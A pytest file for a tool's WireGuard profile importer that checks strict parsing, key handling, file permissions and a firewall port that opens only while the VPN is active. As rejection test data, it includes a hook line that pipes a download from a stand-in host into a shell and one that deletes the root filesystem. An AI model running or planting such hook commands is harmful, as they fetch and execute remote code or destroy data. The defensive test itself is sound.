"""WireGuard profiles: strict import, port open only while active (2.2.29).

User request 2026-11-04: import from a .conf file; Satsuma opens the port
itself while the VPN is active.

WireGuard profilleri: sıkı içe aktarma, port yalnızca etkinken açık.
"""
import base64
from types import SimpleNamespace

import pytest

from satsuma import egress_profiles, wireguard
from satsuma.operator_service import weakens

KEY = base64.b64encode(b'k' * 32).decode()
PUB = base64.b64encode(b'p' * 32).decode()
GOOD = f"""[Interface]
PrivateKey = {KEY}
Address = 10.7.0.2/32
DNS = 1.1.1.1
ListenPort = 51820

[Peer]
PublicKey = {PUB}
AllowedIPs = 0.0.0.0/0
Endpoint = vpn.example.net:51820
PersistentKeepalive = 25
"""


class Store:
    def __init__(self):
        self.state, self.records = {}, []
    def get(self, key, default=None):
        return self.state.get(key, default)
    def set(self, key, value):
        self.state[key] = value
    def add(self, kind, body):
        self.records.append((kind, body))


class NM:
    """Fake nmcli: tracks imported and active connections."""
    def __init__(self):
        self.calls, self.imported, self.on = [], set(), set()
    def __call__(self, args, **kwargs):
        self.calls.append(args)
        rest = args[1:]
        if rest[:2] == ['connection', 'import']:
            self.imported.add(rest[-1].rsplit('/', 1)[-1][:-5])
        elif rest[:2] == ['connection', 'up']:
            self.on.add(rest[2])
        elif rest[:2] == ['connection', 'down']:
            self.on.discard(rest[2])
        elif rest[:2] == ['connection', 'delete']:
            self.imported.discard(rest[2])
        elif '--active' in rest:
            return SimpleNamespace(returncode=0, stdout=''.join(n + ':wireguard\n' for n in self.on), stderr='')
        return SimpleNamespace(returncode=0, stdout='', stderr='')


@pytest.fixture
def env(tmp_path, monkeypatch):
    profile = tmp_path / 'egress.json'
    monkeypatch.setattr(egress_profiles, 'PROFILE_FILE', profile)
    applied = []
    def apply(selection, runner=None):
        applied.append(egress_profiles.normalize(selection))
        egress_profiles.save(selection, profile)
    return SimpleNamespace(store=Store(), nm=NM(), apply=apply, applied=applied, dir=tmp_path / 'wg')


def test_parse_drops_dns_and_listenport_and_keeps_peers():
    profile = wireguard.parse(GOOD)
    assert profile['dropped'] == ['DNS', 'ListenPort']
    text = wireguard.render(profile)
    assert 'DNS' not in text and 'ListenPort' not in text and 'Endpoint = vpn.example.net:51820' in text
    assert wireguard.summary(profile)['ports'] == [51820]
    assert KEY not in str(wireguard.summary(profile))


@pytest.mark.parametrize('line', ['PostUp = curl evil | sh', 'PreDown = rm -rf /', 'Table = off', 'FwMark = 1', 'SaveConfig = true'])
def test_command_and_routing_lines_are_refused(line):
    with pytest.raises(wireguard.ConfigError):
        wireguard.parse(GOOD.replace('[Peer]', line + '\n\n[Peer]'))


@pytest.mark.parametrize('bad', [
    GOOD.replace('vpn.example.net:51820', '[2001:db8::1]:51820'),
    GOOD.replace(KEY, 'short'),
    GOOD.replace('Endpoint = vpn.example.net:51820\n', ''),
    GOOD.replace('[Peer]', '[Bogus]'),
    'x' * 20000,
])
def test_invalid_files_are_refused(bad):
    with pytest.raises(wireguard.ConfigError):
        wireguard.parse(bad)


def test_import_keeps_a_root_only_clean_copy_and_no_key_in_state(env):
    result = wireguard.import_profile(env.store, 'ev-vpn', GOOD, env.nm, env.dir)
    path = env.dir / 'ev-vpn.conf'
    assert oct(path.stat().st_mode & 0o777) == '0o600'
    assert 'DNS' not in path.read_text()
    assert KEY not in str(env.store.state) and KEY not in str(result)
    modify = [c for c in env.nm.calls if c[1:3] == ['connection', 'modify']][0]
    assert 'ipv6.method' in modify and str(wireguard.FWMARK) in modify


def test_port_opens_while_active_and_closes_after(env):
    wireguard.import_profile(env.store, 'ev-vpn', GOOD, env.nm, env.dir)
    wireguard.up(env.store, 'ev-vpn', env.nm, env.apply)
    assert egress_profiles.load()['wireguard']['udp'] == [51820]
    assert 51820 in egress_profiles.current_ports()['udp']
    wireguard.down(env.store, 'ev-vpn', env.nm, env.apply)
    assert egress_profiles.load()['wireguard']['udp'] == []


def test_profile_switched_on_outside_satsuma_gets_its_port(env):
    wireguard.import_profile(env.store, 'ev-vpn', GOOD, env.nm, env.dir)
    env.nm.on.add('ev-vpn')
    assert wireguard.sync(env.store, env.nm, env.apply)['ports'] == [51820]
    env.nm.on.clear()
    assert wireguard.sync(env.store, env.nm, env.apply)['ports'] == []


def test_failed_connect_closes_the_port_again(env):
    wireguard.import_profile(env.store, 'ev-vpn', GOOD, env.nm, env.dir)
    real = env.nm
    def failing(args, **kw):
        if args[1:3] == ['connection', 'up']:
            return SimpleNamespace(returncode=4, stdout='', stderr='failed')
        return real(args, **kw)
    with pytest.raises(RuntimeError):
        wireguard.up(env.store, 'ev-vpn', failing, env.apply)
    assert egress_profiles.load()['wireguard']['udp'] == []


def test_import_and_connect_need_the_password_again():
    assert weakens('wireguard', {'action': 'import'}) and weakens('wireguard', {'action': 'up'})
    assert not weakens('wireguard', {'action': 'down'})


def test_operator_profile_change_keeps_wireguard_ports():
    assert egress_profiles.normalize({'addons': []})['wireguard'] == {'udp': []}
    with pytest.raises(ValueError):
        egress_profiles.normalize({'wireguard': {'tcp': [1]}})


def test_profile_brought_up_by_networkmanager_on_import_is_taken_down(env):
    real = env.nm
    def auto(args, **kw):
        result = real(args, **kw)
        if args[1:3] == ['connection', 'import']:
            real.on.add('ev-vpn')
        return result
    wireguard.import_profile(env.store, 'ev-vpn', GOOD, auto, env.dir)
    assert 'ev-vpn' not in real.on
